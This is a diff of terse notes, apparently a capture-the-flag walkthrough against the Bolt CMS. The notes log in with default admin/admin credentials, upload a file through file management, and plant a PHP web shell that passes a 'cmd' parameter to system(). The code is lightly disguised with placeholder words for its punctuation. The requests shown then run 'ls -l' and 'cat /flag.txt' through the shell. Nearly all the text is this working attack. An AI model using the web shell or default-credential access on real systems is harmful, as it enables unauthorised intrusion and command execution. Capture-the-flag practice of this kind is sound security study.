@@ -2,7 +2,7 @@ Bolt
 ip/bolt/login
 us:admin pass:admin
 in file management: html type file
-url/file/rce.php?cmd=id then cmd=ls%20-l
+url/file/rce.php?cmd=ls%20-l then cmd=cat%20/flag.txt
 convert
 '<(questionmark)php echo system($_GET['cmd'](semicolon)(questionmark))>'
 ip:port/files/file.php?cmd=cat%20/flag.txt
